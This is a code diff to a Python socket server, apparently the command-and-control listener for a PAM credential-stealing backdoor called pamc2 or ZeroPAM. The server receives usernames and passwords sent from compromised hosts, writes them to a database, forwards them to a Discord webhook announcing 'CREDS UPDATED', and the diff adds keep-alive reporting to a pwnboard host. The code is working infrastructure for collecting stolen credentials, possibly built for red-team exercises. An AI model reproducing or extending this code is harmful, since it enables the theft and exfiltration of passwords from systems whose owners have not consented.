@@ -6,18 +6,37 @@ import requests
 import threading
 from dotenv import load_dotenv
 
-def server_args():
+def server_args(cmd_str):
     parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
     parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
                         type=int, dest="port", action="store", default="5000")
     parser.add_argument('--discord', action="store_true", help="Enable Discord Webhook (set WEBHOOK_URL env var)")
     parser.add_argument('--no-db', dest="nodb", action="store_true", help="Run the server without utilizing the database (cannot be used with --only-new)")
     parser.add_argument('--only-new', dest="onlynew", action="store_true", help="Only output new information (cannot be used with --no-db)")
-    return parser.parse_args()
+    parser.add_argument('--pwnboard', dest="pwnboard", action="store_true", help="Send Keep Alive messages to pwnboard")
+    parser.add_argument('--pwnboard-host', metavar="<PWNBOARD WEBSITE>", help="Used with --pwnboard; Pwnboard website to send POST requests to (default localhost:8080)", 
+                        type=str, dest="pwnhost", action="store", default="localhost:8080")
+    return parser.parse_args() if not cmd_str else parser.parse_args(cmd_str.split())
+
+def send_pwnboard(addr, data, pwnhost):
+    ip = data.split("-")[0].strip()
+    host = f"{pwnhost}/generic"
+    data = {"ip": ip, "type": "ZeroPAM"}
+
+    try:
+        response = requests.post(host, json=data, timeout=3)
+        return True
+    except Exception as E:
+        print(E)
+        return False
 
 def send_discord(addr, data):
     ip = data.split("-")[0].strip()
     message = data.split("-")[1].split(":")[0].strip()
+
+    if (message == "KEEP ALIVE"):
+        return 0
+    
     username = data.split("-")[1].split(":")[1].strip()
     password = data.split("-")[1].split(":")[2].strip()
 
@@ -49,7 +68,7 @@ def send_discord(addr, data):
 
     hook_data = {
         'content': data,
-        'username': 'pamc2 bot (type shit)',
+        'username': 'ZeroPAM Bot',
         'avatar_url': 'https://cdn.discordapp.com/emojis/1203535228975448094.webp',
         'embeds': [{
             'description': f"**CREDS UPDATED FROM {ip}**",
@@ -66,6 +85,10 @@ def write_db(addr, data):
 
     ip = data.split("-")[0].strip()
     message = data.split("-")[1].split(":")[0].strip()
+
+    if (message == "KEEP ALIVE"):
+        return 0
+
     username = data.split("-")[1].split(":")[1].strip()
     password = data.split("-")[1].split(":")[2].strip()
 
@@ -158,13 +181,15 @@ def handle_client(lock, c, addr, cmd_args):
         send_discord(addr, data)
     elif (cmd_args.discord and retval == 1):
         send_discord(addr, data)
+
+    if (cmd_args.pwnboard):
+        send_pwnboard(addr, data, cmd_args.pwnhost)
     
     lock.release()
 
     c.close()
 
-def main(cmd_args):
-
+def start_server(cmd_args, stop_event=None):
     server_socket = socket.socket()
     print("Created socket")
 
@@ -174,21 +199,33 @@ def main(cmd_args):
 
     lock = threading.Lock()
 
-    while True:
-        client_socket, addr = server_socket.accept()
-        client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
-        client_thread.start()
+    if (not stop_event):
+        while True:
+            client_socket, addr = server_socket.accept()
+            client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
+            client_thread.start()
+    else:
+        while (not stop_event.is_set()):
+            client_socket, addr = server_socket.accept()
+            client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
+            client_thread.start()
 
-if (__name__ == '__main__'):
+def setup(cmd_args=None, stop_event=None):
     load_dotenv()
-    cmd_args = server_args()
+
+    if(type(cmd_args) == str):
+        cmd_args = server_args(cmd_args)
 
     if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
         print("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
-        exit(1)
+        return False
 
     if (cmd_args.nodb and cmd_args.onlynew):
         print("FATAL ERROR: You cannot run no-db and only-new mode at the same time! Database checking is required for checking if request is new!")
-        exit(1)
+        return False
 
-    main(cmd_args)
+    start_server(cmd_args, stop_event)
+
+if (__name__ == '__main__'):
+    if(not setup()):
+        exit(1)
